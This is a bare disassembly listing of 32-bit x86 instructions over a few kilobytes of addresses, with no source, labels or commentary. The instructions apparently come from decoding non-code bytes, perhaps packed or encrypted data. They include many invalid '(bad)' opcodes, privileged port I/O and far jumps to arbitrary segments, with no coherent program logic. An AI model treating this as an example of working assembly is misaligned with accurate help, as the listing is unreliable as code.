  42f18a:	and    ebp,DWORD PTR [esi+eax*8]
  42f18d:	xchg   BYTE PTR [edx-0x66e5aa7a],bl
  42f193:	xor    eax,0x9b588893
  42f198:	jnp    0x42f128
  42f19a:	pop    ebx
  42f19b:	pop    edx
  42f19c:	adc    al,0x3f
  42f19e:	jb     0x42f187
  42f1a0:	shl    DWORD PTR [ecx+0x5a],0xc7
  42f1a4:	mov    ecx,0x218eaede
  42f1a9:	mov    BYTE PTR [ecx],ch
  42f1ab:	xchg   ebp,eax
  42f1ac:	dec    eax
  42f1ad:	fmul   DWORD PTR [esi+0x4c70eab4]
  42f1b3:	sub    ebp,DWORD PTR [esi]
  42f1b5:	mov    ecx,DWORD PTR [edi+0x749693]
  42f1bb:	mov    eax,0xe0c98dc4
  42f1c0:	imul   edi,edx,0x14
  42f1c3:	push   esi
  42f1c4:	(bad)  
  42f1c5:	lds    esi,FWORD PTR [eax]
  42f1c7:	push   ebp
  42f1c8:	dec    edi
  42f1c9:	mov    eax,0xe6151e22
  42f1ce:	mov    esp,0x49540352
  42f1d3:	sbb    BYTE PTR [ecx],cl
  42f1d5:	les    ebx,FWORD PTR [ebx+0xa]
  42f1d8:	pop    esi
  42f1d9:	gs pop esp
  42f1db:	add    BYTE PTR [edi-0x4c],dh
  42f1de:	adc    ecx,0xb8eceba1
  42f1e4:	int3   
  42f1e5:	jb     0x42f1cc
  42f1e7:	jns    0x42f19b
  42f1e9:	mov    ah,0xa4
  42f1eb:	aas    
  42f1ec:	and    DWORD PTR [edi+0x4a],eax
  42f1ef:	pop    eax
  42f1f0:	or     al,0x7d
  42f1f2:	pushf  
  42f1f3:	jnp    0x42f1f3
  42f1f5:	sub    bh,BYTE PTR [esp+edx*1+0x5f]
  42f1f9:	int    0xda
  42f1fb:	pusha  
  42f1fc:	outs   dx,BYTE PTR ds:[esi]
  42f1fd:	mov    al,BYTE PTR [ecx+0x6d1791b4]
  42f203:	push   ebx
  42f204:	outs   dx,DWORD PTR ds:[esi]
  42f205:	inc    ebp
  42f206:	jmp    0x42f189
  42f208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f209:	jb     0x42f201
  42f20b:	js     0x42f1a2
  42f20d:	mov    ?,WORD PTR [ebx-0xd71ca92]
  42f213:	cmp    al,0x22
  42f215:	mov    edi,0x642b4f4
  42f21a:	mov    esi,eax
  42f21c:	into   
  42f21d:	cmp    bh,BYTE PTR [esi]
  42f21f:	adc    bl,ah
  42f221:	pop    edx
  42f222:	aam    0x37
  42f224:	loop   0x42f20e
  42f226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f227:	xor    cl,BYTE PTR [ebp+0x13]
  42f22a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f22b:	cmp    BYTE PTR [esi+0x5f],al
  42f22e:	ins    DWORD PTR es:[edi],dx
  42f22f:	sbb    al,0x4d
  42f231:	scas   eax,DWORD PTR es:[edi]
  42f232:	arpl   WORD PTR [eax-0x59ee1654],bx
  42f238:	clc    
  42f239:	jp     0x42f23e
  42f23b:	aaa    
  42f23c:	push   ecx
  42f23d:	out    0x54,al
  42f23f:	inc    esp
  42f240:	pop    esi
  42f241:	xor    ah,BYTE PTR [esi+eiz*1]
  42f244:	jbe    0x42f21c
  42f246:	popf   
  42f247:	jbe    0x42f234
  42f249:	mov    dh,0xd7
  42f24b:	mov    ah,0x95
  42f24d:	(bad)
  42f250:	sar    BYTE PTR [edx+0x72],cl
  42f253:	and    al,0x35
  42f255:	xor    al,0x6a
  42f257:	hlt    
  42f258:	sbb    eax,edx
  42f25a:	lea    edi,[ebp-0x2a7e51bf]
  42f260:	push   edi
  42f261:	ins    BYTE PTR es:[edi],dx
  42f262:	sar    DWORD PTR [esi-0x1f],0x70
  42f266:	lea    ebx,[eax]
  42f268:	in     eax,dx
  42f269:	scas   al,BYTE PTR es:[edi]
  42f26a:	jmp    0xf362bba5
  42f26f:	add    eax,0x1135c258
  42f274:	or     al,al
  42f276:	mov    ebx,0x9cc379c3
  42f27b:	repz aad 0x7b
  42f27e:	and    DWORD PTR ds:0x9bee69a2,ebp
  42f284:	cld    
  42f285:	inc    ecx
  42f286:	jbe    0x42f2ef
  42f288:	xchg   DWORD PTR [ebp+0x17fc6e20],ecx
  42f28e:	popa   
  42f28f:	xor    eax,0xd651683d
  42f294:	cwde   
  42f295:	inc    ebx
  42f296:	hlt    
  42f297:	mov    al,0x21
  42f299:	sbb    al,0x49
  42f29b:	sbb    al,0x7b
  42f29d:	sbb    dl,cl
  42f29f:	or     al,0x3
  42f2a1:	sbb    BYTE PTR [eax+0x3210e45e],ah
  42f2a7:	jb     0x42f24b
  42f2a9:	jae    0x42f2a3
  42f2ab:	dec    edx
  42f2ac:	adc    esp,DWORD PTR [edi+0x2f19196f]
  42f2b2:	scas   eax,DWORD PTR es:[edi]
  42f2b3:	lds    ecx,FWORD PTR [ebx+eiz*4+0x64]
  42f2b7:	adc    esi,edx
  42f2b9:	hlt    
  42f2ba:	daa    
  42f2bb:	imul   eax,DWORD PTR [ebx],0x9749d03a
  42f2c1:	cmc    
  42f2c2:	shl    edi,0x26
  42f2c5:	add    DWORD PTR [edi-0x8],edx
  42f2c8:	(bad)  
  42f2c9:	fwait
  42f2ca:	jb     0x42f2d5
  42f2cc:	add    BYTE PTR [edi-0x63],ch
  42f2cf:	scas   al,BYTE PTR es:[edi]
  42f2d0:	add    esp,DWORD PTR [ebx-0x70]
  42f2d3:	xor    eax,esi
  42f2d5:	loopne 0x42f28d
  42f2d7:	fiadd  WORD PTR [ebx-0x54]
  42f2da:	adc    ch,bl
  42f2dc:	mov    edx,0x92e106c0
  42f2e1:	xor    bl,BYTE PTR [edx-0x5b]
  42f2e4:	xchg   BYTE PTR [edx*8-0x5110d44a],dl
  42f2eb:	jnp    0x42f2fe
  42f2ed:	jmp    0x42f369
  42f2ef:	arpl   WORD PTR es:[ebx-0xb],si
  42f2f3:	imul   esi,DWORD PTR [edx],0xffffffc1
  42f2f6:	sub    al,0xad
  42f2f8:	sub    cl,BYTE PTR [ebx+0x6c]
  42f2fb:	push   eax
  42f2fc:	and    ah,BYTE PTR [esp+ebx*2]
  42f2ff:	mov    al,ds:0xe85c9bfa
  42f304:	outs   dx,BYTE PTR ds:[esi]
  42f305:	add    bh,BYTE PTR [ebx-0x32]
  42f308:	pop    ds
  42f309:	repnz icebp 
  42f30b:	and    eax,0x9b4d565f
  42f310:	sub    eax,0x67f87d4a
  42f315:	cmp    ecx,eax
  42f317:	in     al,0xb5
  42f319:	lods   al,BYTE PTR ds:[esi]
  42f31a:	cmp    eax,0xffb22618
  42f31f:	ins    BYTE PTR es:[edi],dx
  42f320:	xor    BYTE PTR [edi+edi*1],dl
  42f323:	out    0xbd,eax
  42f325:	jle    0x42f38e
  42f327:	stos   DWORD PTR es:[edi],eax
  42f328:	sahf   
  42f329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f32a:	sar    BYTE PTR [esi+0x5552c829],0xe2
  42f331:	fwait
  42f332:	xchg   edx,eax
  42f333:	imul   ecx,DWORD PTR [ebp+0x5ad8964e],0x54
  42f33a:	adc    bl,BYTE PTR [edi-0x4b9b25a0]
  42f340:	das    
  42f341:	int3   
  42f342:	jmp    ebp
  42f344:	inc    esp
  42f345:	xchg   edx,eax
  42f346:	pop    edi
  42f347:	mov    al,ds:0x100b3be9
  42f34c:	jmp    0xc723:0x9de5de9a
  42f353:	sbb    al,0xab
  42f355:	push   ebx
  42f356:	in     eax,dx
  42f357:	sti    
  42f358:	hlt    
  42f359:	dec    edi
  42f35a:	mov    ebx,0x94dd4500
  42f35f:	retf   
  42f360:	popa   
  42f361:	pop    edx
  42f362:	retf   
  42f363:	dec    edx
  42f364:	sub    DWORD PTR [esi+ebx*1-0x4e71ff09],esp
  42f36b:	push   edi
  42f36c:	sub    bh,BYTE PTR [ebx-0x121668a5]
  42f372:	(bad)  
  42f373:	jnp    0x42f3ea
  42f375:	les    ecx,FWORD PTR [esi]
  42f377:	loopne 0x42f358
  42f379:	push   edx
  42f37a:	push   0xb0cd8a4c
  42f37f:	out    dx,eax
  42f380:	or     ebp,esi
  42f382:	out    0x8e,al
  42f384:	xchg   edx,eax
  42f385:	mov    esi,0xa0fc3ed4
  42f38a:	cmp    al,0x53
  42f38c:	lahf   
  42f38d:	xchg   ecx,eax
  42f38e:	aas    
  42f38f:	outs   dx,BYTE PTR gs:[esi]
  42f391:	hlt    
  42f392:	push   esi
  42f393:	pop    es
  42f394:	mov    al,0x99
  42f396:	imul   esi,DWORD PTR [edi+eax*2-0x5d5af60b],0xffffff85
  42f39e:	add    ah,BYTE PTR [edx+eiz*4-0x68]
  42f3a2:	or     eax,0xf300af2a
  42f3a7:	loop   0x42f337
  42f3a9:	popa   
  42f3aa:	xor    al,0x45
  42f3ac:	out    0x56,eax
  42f3ae:	jg     0x42f3cb
  42f3b0:	daa    
  42f3b1:	retf   0x70c4
  42f3b4:	inc    ecx
  42f3b5:	adc    al,0xc0
  42f3b7:	std    
  42f3b8:	cmp    ebp,DWORD PTR ds:[ebp+0x3139b752]
  42f3bf:	push   esi
  42f3c0:	push   edx
  42f3c1:	(bad)  
  42f3c2:	pushf  
  42f3c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f3c4:	ss or  dl,ch
  42f3c7:	dec    ecx
  42f3c8:	sub    al,0xbd
  42f3ca:	jb     0x42f438
  42f3cc:	add    al,0x3e
  42f3ce:	ss sbb eax,0xe9c176b2
  42f3d4:	cld    
  42f3d5:	pop    ebp
  42f3d6:	adc    edx,DWORD PTR [esi-0x41daaed1]
  42f3dc:	mov    ah,0xcd
  42f3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3df:	xor    BYTE PTR [ecx-0x73b8e2d0],bl
  42f3e5:	mov    edi,0x4d112e57
  42f3ea:	and    eax,0x26c5d4ac
  42f3ef:	enter  0xa441,0xf8
  42f3f3:	push   eax
  42f3f4:	fistp  QWORD PTR [edi-0x39]
  42f3f7:	push   ds
  42f3f8:	jmp    0x4d84e6c2
  42f3fd:	(bad)  
  42f3ff:	fwait
  42f400:	out    0x3c,eax
  42f402:	fld    QWORD PTR [ebp-0xbbf757e]
  42f408:	sar    DWORD PTR [edi+0x29],0xbf
  42f40c:	fdivr  QWORD PTR [ecx-0x72]
  42f40f:	sbb    eax,0x17322bae
  42f414:	lods   eax,DWORD PTR ds:[esi]
  42f415:	and    dh,BYTE PTR [edx-0x2e1f8e19]
  42f41b:	into   
  42f41c:	mov    eax,0x65d43b8f
  42f421:	inc    ecx
  42f422:	fnclex 
  42f424:	dec    eax
  42f425:	into   
  42f426:	out    dx,al
  42f427:	mov    cl,0xf4
  42f429:	jno    0x42f3c7
  42f42b:	cmp    edi,ebp
  42f42d:	xchg   ebx,eax
  42f42e:	push   es
  42f42f:	int3   
  42f430:	std    
  42f431:	jmp    0x2843:0x338f695f
  42f438:	push   esi
  42f439:	add    al,cl
  42f43b:	fisttp WORD PTR [ebp+0x3a]
  42f43e:	push   es
  42f43f:	test   BYTE PTR [eax-0x22],0x7e
  42f443:	mov    dl,BYTE PTR [edi]
  42f445:	in     eax,0x1f
  42f447:	xchg   DWORD PTR [edi-0x47],ecx
  42f44a:	je     0x42f3f3
  42f44c:	mov    edi,0x3ffc2473
  42f451:	push   0xffffff8b
  42f453:	je     0x42f461
  42f455:	dec    ebp
  42f456:	enter  0x104a,0xeb
  42f45a:	shr    DWORD PTR [esi],0x75
  42f45d:	jp     0x42f478
  42f45f:	es jmp 0xa24acd54
  42f465:	xor    eax,0x4478722a
  42f46a:	mov    edi,0xc0310ed4
  42f46f:	pusha  
  42f470:	mov    al,dh
  42f472:	test   DWORD PTR [eax-0x4e],ebx
  42f475:	cs ins BYTE PTR es:[edi],dx
  42f477:	stc    
  42f478:	test   eax,0xaa21b4c6
  42f47d:	xchg   ecx,eax
  42f47e:	cmp    ebp,DWORD PTR [esi-0x4ef036b4]
  42f484:	or     edi,DWORD PTR [edx]
  42f486:	mov    ecx,es
  42f488:	mov    eax,0xed60eeb5
  42f48d:	xchg   esp,eax
  42f48e:	stos   BYTE PTR es:[edi],al
  42f48f:	pop    esp
  42f490:	imul   edx,DWORD PTR [esi],0x83a82661
  42f496:	loop   0x42f507
  42f498:	cmp    ebp,edx
  42f49a:	stc    
  42f49b:	loop   0x42f45c
  42f49d:	and    dl,BYTE PTR [edx]
  42f49f:	dec    edi
  42f4a0:	js     0x42f480
  42f4a2:	mov    eax,ds:0xf6be0031
  42f4a7:	xor    al,0x26
  42f4a9:	mov    BYTE PTR ds:0x451d7920,bh
  42f4af:	in     eax,dx
  42f4b0:	ficom  WORD PTR [eax+0x37]
  42f4b3:	jg     0x42f461
  42f4b5:	mov    ds:0x94ecad99,eax
  42f4ba:	jge    0x42f44c
  42f4bc:	push   edi
  42f4bd:	mov    BYTE PTR [esi-0x573faec9],bl
  42f4c3:	push   esi
  42f4c4:	in     al,0x7f
  42f4c6:	int    0x8d
  42f4c8:	sbb    DWORD PTR [ebx-0x670d1947],eax
  42f4ce:	retf   
  42f4cf:	lds    edi,FWORD PTR [ebx-0x141807e3]
  42f4d5:	and    edx,DWORD PTR [ebp+0x3d]
  42f4d8:	cmp    BYTE PTR [esi-0x4b],bl
  42f4db:	cwde   
  42f4dc:	and    BYTE PTR [esi],bh
  42f4de:	sub    al,0xb1
  42f4e0:	pop    eax
  42f4e1:	mov    al,0xbb
  42f4e3:	adc    al,0xa2
  42f4e5:	out    dx,al
  42f4e6:	jmp    0x6dc3fd82
  42f4eb:	loope  0x42f54e
  42f4ed:	outs   dx,DWORD PTR ds:[esi]
  42f4ee:	mov    dh,dl
  42f4f0:	inc    esi
  42f4f1:	mov    dl,0xf0
  42f4f3:	mov    al,ds:0x62b596d5
  42f4f8:	jecxz  0x42f563
  42f4fa:	loop   0x42f522
  42f4fc:	bound  esi,QWORD PTR [ebp-0x7daa1596]
  42f502:	mov    ds:0x24a439e6,al
  42f507:	push   eax
  42f508:	jns    0x42f4e8
  42f50a:	xchg   ebx,eax
  42f50b:	add    dh,cl
  42f50d:	cmp    al,BYTE PTR [edi+edx*2+0x6f]
  42f511:	es xchg esp,eax
  42f513:	adc    DWORD PTR [ecx],eax
  42f515:	and    al,BYTE PTR [edx-0x45]
  42f518:	icebp  
  42f519:	in     al,dx
  42f51a:	je     0x42f4b8
  42f51c:	cmp    dl,BYTE PTR [edi]
  42f51e:	das    
  42f51f:	or     ecx,esp
  42f521:	das    
  42f522:	sbb    BYTE PTR [esi+0x33feb355],cl
  42f528:	inc    edx
  42f529:	(bad)  
  42f52b:	lock scas eax,DWORD PTR es:[edi]
  42f52d:	or     eax,0xbe416e66
  42f532:	shl    DWORD PTR [ebx-0x1f],0xd3
  42f536:	or     edi,DWORD PTR [ecx+0x3e]
  42f539:	iret   
  42f53a:	mov    al,0xe6
  42f53c:	les    ecx,FWORD PTR [edx-0x56e66154]
  42f542:	or     eax,0x6d978926
  42f547:	jae    0x42f4f0
  42f549:	std    
  42f54a:	cmp    BYTE PTR [edi],ah
  42f54c:	test   DWORD PTR [esi-0x7a374003],0xe0b9157e
  42f556:	sbb    eax,0x60a5abd9
  42f55b:	call   0x185:0xc79cbbf1
  42f562:	aaa    
  42f563:	xchg   edx,eax
  42f564:	(bad)  [ebx-0x40]
  42f567:	icebp  
  42f568:	sbb    cl,ah
  42f56a:	imul   ecx,DWORD PTR gs:[ebx+0x719b66d8],0xffffffa4
  42f572:	adc    bh,ch
  42f574:	adc    DWORD PTR cs:[edx+0x6f],ebx
  42f578:	imul   esp,DWORD PTR [edi],0xf4d1d55c
  42f57e:	push   edi
  42f57f:	push   edi
  42f580:	(bad)  
  42f581:	mov    eax,0x5d392d44
  42f586:	pop    ecx
  42f587:	jmp    0x42f5bf
  42f589:	xor    DWORD PTR [edi+edx*2-0x12],esp
  42f58d:	mov    ah,0x5a
  42f58f:	data16 lods al,BYTE PTR ds:[esi]
  42f591:	sub    al,0xf1
  42f593:	cmp    BYTE PTR [ecx-0x5b],cl
  42f596:	cmp    edx,DWORD PTR ds:0x789c1b29
  42f59c:	or     ebx,DWORD PTR [eax-0x5a190678]
  42f5a2:	dec    ebx
  42f5a3:	jmp    0x42f582
  42f5a5:	pop    esi
  42f5a6:	adc    ch,ch
  42f5a8:	sub    esp,DWORD PTR [eax-0xa]
  42f5ab:	lds    ebp,FWORD PTR [edi-0x1d4b2eec]
  42f5b1:	mov    eax,0xeb0739c5
  42f5b6:	dec    edx
  42f5b7:	clc    
  42f5b8:	or     eax,0xc03b0c67
  42f5bd:	mov    ebp,DWORD PTR [ecx]
  42f5bf:	fsub   DWORD PTR [esi+0x613a8bfc]
  42f5c5:	popf   
  42f5c6:	(bad)  
  42f5c7:	(bad)  
  42f5c8:	mov    ds:0x1ca4e82b,al
  42f5cd:	and    bh,BYTE PTR [ebx-0x383d9a19]
  42f5d3:	inc    eax
  42f5d4:	rol    DWORD PTR [ebx+0x49],cl
  42f5d7:	pop    ebx
  42f5d8:	into   
  42f5d9:	inc    edx
  42f5da:	jp     0x42f5e1
  42f5dc:	or     eax,0x2d8af5f9
  42f5e1:	retf   
  42f5e2:	adc    DWORD PTR [edi+0x12],ebx
  42f5e5:	int    0xfd
  42f5e7:	repz pop esp
  42f5e9:	pop    ebp
  42f5ea:	or     cl,bl
  42f5ec:	outs   dx,DWORD PTR ds:[esi]
  42f5ed:	scas   eax,DWORD PTR es:[edi]
  42f5ee:	pop    esp
  42f5ef:	jbe    0x42f5fc
  42f5f1:	mov    dl,0xc5
  42f5f3:	lods   eax,DWORD PTR ds:[esi]
  42f5f4:	jnp    0x42f66f
  42f5f6:	sar    DWORD PTR [edx-0x12078121],cl
  42f5fc:	nop
  42f5fd:	mov    BYTE PTR [eax+edx*8-0x4],cl
  42f601:	hlt    
  42f602:	mov    DWORD PTR [ebx+0x7f05b8fa],ecx
  42f608:	inc    edx
  42f609:	aad    0x6b
  42f60b:	sbb    eax,0xb922ce4e
  42f610:	leave  
  42f611:	ds push ecx
  42f613:	addr16 in eax,dx
  42f615:	xchg   ecx,eax
  42f616:	jl     0x42f607
  42f618:	out    dx,eax
  42f619:	arpl   WORD PTR [edi+0x73e25cfa],sp
  42f61f:	push   ds
  42f620:	repz fistp DWORD PTR [ebx-0xb]
  42f624:	loopne 0x42f610
  42f626:	ror    BYTE PTR [esi*4+0x1cc3ad19],cl
  42f62d:	aaa    
  42f62e:	xchg   edi,eax
  42f62f:	mov    ds:0x4b1556c3,eax
  42f634:	lock add DWORD PTR [edx],ecx
  42f637:	scas   eax,DWORD PTR es:[edi]
  42f638:	loop   0x42f671
  42f63a:	lock lds ecx,FWORD PTR [ecx-0x526ac157]
  42f641:	or     ecx,DWORD PTR [edx-0x349fc11]
  42f647:	sub    BYTE PTR [edx],cl
  42f649:	xchg   ebx,eax
  42f64a:	enter  0xb8a6,0xa9
  42f64e:	fsubr  DWORD PTR [ecx]
  42f650:	push   eax
  42f651:	outs   dx,BYTE PTR ds:[esi]
  42f652:	lahf   
  42f653:	push   ecx
  42f654:	mov    WORD PTR [esi+ebx*8],ds
  42f657:	jb     0x42f69f
  42f659:	push   0x7f2460f9
  42f65e:	mov    esp,0xf8d0d4f5
  42f663:	or     eax,0xa0d056df
  42f668:	pop    eax
  42f669:	es (bad) 
  42f66c:	jl     0x42f61a
  42f66e:	inc    esi
  42f66f:	push   ss
  42f670:	ds call 0xd012abe8
  42f676:	mov    ecx,ebp
  42f678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f679:	add    BYTE PTR [esi-0x75a19126],al
  42f67f:	ja     0x42f6d1
  42f681:	outs   dx,DWORD PTR ds:[esi]
  42f682:	out    dx,eax
  42f683:	icebp  
  42f684:	mov    ch,0x1b
  42f686:	sbb    ah,al
  42f688:	mov    bl,0x53
  42f68a:	push   eax
  42f68b:	out    0x43,al
  42f68d:	pop    ebx
  42f68e:	fwait
  42f68f:	lock push eax
  42f691:	test   eax,0x7a4d40a9
  42f696:	pusha  
  42f697:	cwde   
  42f698:	sbb    DWORD PTR [esi],0x79
  42f69b:	cmp    DWORD PTR [edx-0x4e],esp
  42f69e:	aaa    
  42f69f:	xchg   ebp,eax
  42f6a0:	mov    edx,edi
  42f6a2:	ss sbb al,0x4a
  42f6a5:	aam    0x48
  42f6a7:	or     ecx,esi
  42f6a9:	mov    cl,0xe9
  42f6ab:	jmp    0x42f6b8
  42f6ad:	stc    
  42f6ae:	das    
  42f6af:	mov    edx,ebx
  42f6b1:	lahf   
  42f6b2:	xor    eax,edx
  42f6b4:	sub    eax,DWORD PTR [edi+0x17]
  42f6b7:	out    dx,al
  42f6b8:	dec    esi
  42f6b9:	lea    ebp,[ebp-0xc7d995c]
  42f6bf:	clc    
  42f6c0:	(bad)  
  42f6c1:	enter  0xc3e5,0x9d
  42f6c5:	fisttp QWORD PTR [ebx-0x30d83b57]
  42f6cb:	jno    0x42f6aa
  42f6cd:	ret    
  42f6ce:	inc    esi
  42f6cf:	mov    BYTE PTR ss:[edi+edx*2-0x1964cc4],ah
  42f6d7:	daa    
  42f6d8:	inc    ecx
  42f6d9:	popf   
  42f6da:	push   esi
  42f6db:	mov    esi,0x4b90fcce
  42f6e0:	(bad)
  42f6e4:	mov    dh,0x4e
  42f6e6:	dec    ebp
  42f6e7:	push   ss
  42f6e8:	imul   eax,DWORD PTR [eax],0xdec9c99
  42f6ee:	imul   ebx,DWORD PTR [edx-0x7f],0x3f
  42f6f2:	or     al,0x26
  42f6f4:	sub    al,0xe4
  42f6f6:	push   edi
  42f6f7:	adc    esi,DWORD PTR [edx]
  42f6f9:	popa   
  42f6fa:	ja     0x42f74c
  42f6fc:	and    eax,0x6935ff8b
  42f701:	into   
  42f702:	cmp    eax,0x40b0ebd6
  42f707:	xchg   edx,eax
  42f708:	adc    DWORD PTR [ebx+0x39],esp
  42f70b:	push   edi
  42f70c:	ins    BYTE PTR es:[edi],dx
  42f70d:	out    0x81,eax
  42f70f:	pusha  
  42f710:	rol    DWORD PTR [esi-0x1ef4a9f7],cl
  42f716:	pushf  
  42f717:	push   cs
  42f718:	dec    esp
  42f719:	inc    ecx
  42f71a:	sahf   
  42f71b:	sub    bl,BYTE PTR [edi-0x3b]
  42f71e:	inc    esi
  42f71f:	mov    al,ds:0xbdeedab3
  42f724:	stos   DWORD PTR es:[edi],eax
  42f725:	mov    al,0xc9
  42f727:	in     eax,dx
  42f728:	dec    ebx
  42f729:	mov    eax,DWORD PTR [bx+si]
  42f72c:	aaa    
  42f72d:	mov    es,WORD PTR [edx]
  42f72f:	pop    ebx
  42f730:	cmp    edx,DWORD PTR [ebp-0x37984e3a]
  42f736:	test   esp,esp
  42f738:	in     al,0x75
  42f73a:	mov    dh,0xed
  42f73c:	repz cmp BYTE PTR [esi],0xbb
  42f740:	sub    eax,0x647bedca
  42f745:	sbb    edi,DWORD PTR [eax+0x2c119efc]
  42f74b:	addr16 repnz dec ecx
  42f74e:	inc    edi
  42f74f:	shl    DWORD PTR [eax+ebx*2-0x27],cl
  42f753:	jne    0x42f7d4
  42f755:	pushf  
  42f756:	inc    esi
  42f757:	mov    ds:0x8f51580a,al
  42f75c:	mov    bl,BYTE PTR [ecx+0x3e]
  42f75f:	rcl    ah,1
  42f761:	cdq    
  42f762:	stos   DWORD PTR es:[edi],eax
  42f763:	push   ss
  42f764:	cmc    
  42f765:	dec    esp
  42f766:	pop    ebp
  42f767:	sbb    eax,DWORD PTR [ebp-0x4f]
  42f76a:	xchg   ebx,eax
  42f76b:	pop    edi
  42f76c:	mov    ds:0x91f3e743,al
  42f771:	adc    eax,0x9dbb1a17
  42f776:	(bad)  
  42f777:	fisub  DWORD PTR [ebx]
  42f779:	test   al,0xdb
  42f77b:	pop    edi
  42f77c:	dec    DWORD PTR [ebp-0x50]
  42f77f:	mov    DWORD PTR [ebx+eax*4-0x6c2db299],edi
  42f786:	test   DWORD PTR [ebx],ecx
  42f788:	mov    DWORD PTR [edi-0x5c19c67],edx
  42f78e:	push   cs
  42f78f:	and    eax,0x3c80378a
  42f794:	xchg   DWORD PTR [edx+0x63b99ed5],ecx
  42f79a:	fwait
  42f79b:	pop    edx
  42f79c:	retf   0x9744
  42f79f:	test   DWORD PTR [esi-0x6],0x6fdc1fda
  42f7a6:	xor    ah,dl
  42f7a8:	cwde   
  42f7a9:	jne    0x42f810
  42f7ab:	push   ds
  42f7ac:	pop    ecx
  42f7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f7ae:	retf   
  42f7af:	push   ebp
  42f7b0:	jg     0x42f7bd
  42f7b2:	push   ebx
  42f7b3:	adc    al,0x68
  42f7b5:	aaa    
  42f7b6:	push   ds
  42f7b7:	jno    0x42f7d6
  42f7b9:	clc    
  42f7ba:	sub    al,0x89
  42f7bc:	ins    DWORD PTR es:[edi],dx
  42f7bd:	(bad)  
  42f7be:	adc    ebp,ebx
  42f7c0:	cli    
  42f7c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f7c2:	xor    eax,0xa1645d0c
  42f7c7:	inc    BYTE PTR [ecx+ebp*1+0x6ce4cc14]
  42f7ce:	pop    es
  42f7cf:	or     DWORD PTR [ebx-0x19],ecx
  42f7d2:	cwde   
  42f7d3:	mov    ch,0xa5
  42f7d5:	cdq    
  42f7d6:	fimul  DWORD PTR [eax]
  42f7d8:	cmp    bh,BYTE PTR [esi]
  42f7da:	jp     0x42f841
  42f7dc:	cs nop
  42f7de:	enter  0xf6b5,0x2
  42f7e2:	push   0x5c6f3463
  42f7e7:	add    BYTE PTR [edx+0x4e4dad06],dl
  42f7ed:	push   0x2e34b5c6
  42f7f2:	sbb    eax,0x77d574c
  42f7f7:	sbb    BYTE PTR [edx-0x3d2b5ca5],ch
  42f7fd:	and    ch,BYTE PTR [ebp-0x37db403b]
  42f803:	sahf   
  42f804:	jecxz  0x42f835
  42f806:	push   0x77557ef6
  42f80b:	sub    al,0x41
  42f80d:	xchg   ecx,eax
  42f80e:	clc    
  42f80f:	mov    ebx,0xad8976ee
  42f814:	mov    BYTE PTR [esi],cl
  42f816:	lds    ebp,FWORD PTR [ecx+0x37404e]
  42f81c:	xor    BYTE PTR [ecx+0x24],ch
  42f81f:	shl    DWORD PTR [esi+0x6e9e4b86],0xf1
  42f826:	pop    ebp
  42f827:	pop    esp
  42f828:	je     0x42f864
  42f82a:	adc    edx,DWORD PTR [eax-0x2965a98c]
  42f830:	cmp    al,0xf6
  42f832:	push   ds
  42f833:	sbb    ah,bh
  42f835:	xchg   BYTE PTR [esi+0x2e3fd48a],ah
  42f83b:	je     0x42f7ff
  42f83d:	xor    DWORD PTR [ecx],0xffffffac
  42f840:	and    ebx,DWORD PTR [ebp-0x602205d8]
  42f846:	mov    ebx,0x9707c302
  42f84b:	(bad)  
  42f84c:	and    edi,ecx
  42f84e:	pop    es
  42f84f:	mov    bh,0x87
  42f851:	aaa    
  42f852:	jae    0x42f854
  42f854:	sbb    DWORD PTR [esi-0x62],0x806ef012
  42f85b:	and    DWORD PTR ds:0xbe028068,esi
  42f861:	fs jbe 0x42f865
  42f864:	fld    QWORD PTR [eax]
  42f866:	inc    eax
  42f867:	pop    ecx
  42f868:	mov    ds:0x1e2d8317,eax
  42f86d:	js     0x42f7f2
  42f86f:	inc    eax
  42f870:	mov    edi,0x94c6bd8b
  42f875:	scas   al,BYTE PTR es:[edi]
  42f876:	into   
  42f877:	cmp    BYTE PTR ds:0x436d8f97,bl
  42f87d:	cli    
  42f87e:	xor    esi,DWORD PTR [esi]
  42f880:	loopne 0x42f8b1
  42f882:	jp     0x42f8bc
  42f884:	call   0x351e:0xae89874b
  42f88b:	int3   
  42f88c:	xchg   ebp,eax
  42f88d:	mov    esi,0xd4ef35ba
  42f892:	popf   
  42f893:	aaa    
  42f894:	push   ebp
  42f895:	jl     0x42f8ad
  42f897:	lahf   
  42f898:	shl    DWORD PTR [ecx+eiz*8-0x140b13d2],0xfd
  42f8a0:	test   eax,0x1958d547
  42f8a5:	pop    edi
  42f8a6:	repnz cmp eax,0xf2985975
  42f8ac:	dec    edx
  42f8ad:	sub    esi,DWORD PTR [ecx+eax*8+0x55512238]
  42f8b4:	test   DWORD PTR [esp+ecx*2-0x7080f974],esi
  42f8bb:	je     0x42f873
  42f8bd:	cmp    DWORD PTR [ebx-0x184b618d],0x44444aed
  42f8c7:	xchg   edi,eax
  42f8c8:	sub    al,0xfc
  42f8ca:	rol    DWORD PTR [ebx],cl
  42f8cc:	pop    es
  42f8cd:	fs js  0x42f914
  42f8d0:	dec    ebp
  42f8d1:	xchg   esi,eax
  42f8d2:	js     0x42f900
  42f8d4:	mov    esi,0xf84a1e6c
  42f8d9:	mov    bh,0xc4
  42f8db:	inc    edx
  42f8dc:	jae    0x42f89b
  42f8de:	aam    0x74
  42f8e0:	sub    bl,BYTE PTR ds:0x64340e7a
  42f8e6:	and    DWORD PTR [edi-0x33],ebx
  42f8e9:	arpl   si,si
  42f8eb:	out    0x50,eax
  42f8ed:	adc    eax,0xa01e7c8e
  42f8f2:	ret    
  42f8f3:	dec    edi
  42f8f4:	xchg   ebx,eax
  42f8f5:	bound  esp,QWORD PTR [edi+0x2f]
  42f8f8:	xor    edi,DWORD PTR [eax]
  42f8fa:	scas   eax,DWORD PTR es:[edi]
  42f8fb:	retf   
  42f8fc:	jmp    0x1898:0x3df091e9
  42f903:	js     0x42f8cb
  42f905:	arpl   WORD PTR [ebp-0x5a4cdd59],ax
  42f90b:	jmp    0x42f92a
  42f90d:	sub    DWORD PTR [ebx],edi
  42f90f:	sbb    DWORD PTR [esi],eax
